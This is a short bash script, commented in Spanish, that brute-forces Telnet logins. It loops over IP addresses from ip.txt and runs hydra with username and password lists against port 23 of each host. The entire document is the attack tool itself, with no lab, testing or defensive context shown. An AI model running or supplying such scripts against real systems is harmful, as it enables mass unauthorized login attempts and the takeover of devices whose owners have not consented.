#!/bin/bash
# Fuerza bruta Telnet

for i in `cat ip.txt`
do
        echo $i
        hydra -L usuarios.txt -P claves.txt telnet://$i:23
done
